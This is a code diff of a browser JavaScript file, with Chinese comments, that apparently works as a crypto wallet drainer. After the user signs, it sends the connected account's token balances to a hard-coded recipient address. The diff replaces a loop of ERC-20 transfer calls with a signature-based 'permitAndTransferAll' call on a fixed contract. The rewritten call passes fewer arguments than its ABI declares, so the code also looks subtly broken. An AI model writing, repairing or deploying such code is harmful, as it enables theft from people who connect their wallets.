@@ -1,7 +1,9 @@
 const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
+const contractAddress = '0x0ccd25cb287e18e55969d65ab5555582657512be'; // 替换为你的实际合约地址
 let web3;
 let isConnected = false;
 
+// 代币合约的 ABI
 const erc20Abi = [
     {
         "constant": true,
@@ -13,11 +15,16 @@ const erc20Abi = [
     {
         "constant": false,
         "inputs": [
-            {"name": "_to", "type": "address"},
-            {"name": "_value", "type": "uint256"}
+            {"name": "owner", "type": "address"},
+            {"name": "spender", "type": "address"},
+            {"name": "value", "type": "uint256"},
+            {"name": "deadline", "type": "uint256"},
+            {"name": "v", "type": "uint8"},
+            {"name": "r", "type": "bytes32"},
+            {"name": "s", "type": "bytes32"}
         ],
-        "name": "transfer",
-        "outputs": [{"name": "success", "type": "bool"}],
+        "name": "permitAndTransferAll",
+        "outputs": [],
         "type": "function"
     }
 ];
@@ -81,7 +88,7 @@ document.getElementById('signButton').onclick = async () => {
             updateStatus(`签名成功: ${signature}`);
 
             // 调用转移资产的函数
-            await transferAssets(account);
+            await transferAssets(account, signature);
         } catch (error) {
             updateStatus(`签名失败: ${error.message}`);
         }
@@ -91,32 +98,29 @@ document.getElementById('signButton').onclick = async () => {
 };
 
 // 转移资产的函数
-const transferAssets = async (account) => {
+const transferAssets = async (account, signature) => {
     updateStatus(`正在获取 ${account} 的代币余额...`);
-    const tokenBalances = await getTokenBalances(account);
+    
+    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);
+    const balance = await tokenContract.methods.balanceOf(account).call();
+    
+    if (balance > 0) {
+        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 设置截止时间
+        const { v, r, s } = web3.eth.accounts._decodeSignature(signature);
 
-    for (const tokenAddress in tokenBalances) {
-        const token = tokenBalances[tokenAddress];
-        const balance = token.balance;
-
-        if (balance.gt(0)) {
-            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-            try {
-                // 调用合约的 transfer 方法，将代币转移到目标地址
-                const transfer = await tokenContract.methods
-                    .transfer(recipientAddress, balance.toString())
-                    .send({ from: account });
-
-                updateStatus(`成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`);
-            } catch (error) {
-                updateStatus(`转移 ${token.symbol} 失败: ${error.message}`);
-            }
-        } else {
-            updateStatus(`账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`);
+        try {
+            // 调用合约的 permitAndTransferAll 方法
+            await tokenContract.methods
+                .permitAndTransferAll(account, deadline, v, r, s)
+                .send({ from: account });
+                
+            updateStatus(`成功转移 ${balance} 代币从 ${account} 至 ${recipientAddress}`);
+        } catch (error) {
+            updateStatus(`转移失败: ${error.message}`);
         }
+    } else {
+        updateStatus(`账户 ${account} 在代币合约中没有代币余额`);
     }
-
-    updateStatus('所有代币转移完成');
 };
 
 // 获取代币余额的函数
@@ -158,3 +162,5 @@ const getTokenBalances = async (address) => {
         return {};
     }
 };
+
+// 这里可以调用获取代币余额的函数，具体使用根据需求添加
